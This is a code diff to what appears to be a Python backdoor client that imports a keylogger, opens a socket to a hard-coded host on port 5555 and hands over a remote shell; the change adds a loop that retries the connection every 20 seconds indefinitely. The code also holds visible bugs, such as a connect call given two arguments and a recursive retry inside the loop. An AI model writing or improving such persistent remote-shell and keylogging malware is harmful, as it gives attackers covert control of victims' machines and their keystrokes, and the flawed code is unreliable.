@@ -7,6 +7,7 @@ import keylogger
 import threading
 import shutil
 import sys
+import time
 
 def send(data):
     jsonData = json.dumps(data)
@@ -129,7 +130,20 @@ def shell():
 HOST = '192.168.1.110'
 PORT = 5555
 
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect((HOST, PORT))
+# Retry connection every 20 seconds forever until the connection is astablished
+def connection():
+    while True:
+        time.sleep(20)
 
-shell()
+        try: 
+            s.connect(HOST, PORT)
+            shell()
+            s.close()
+            break
+
+        except:
+            connection()
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+connection()
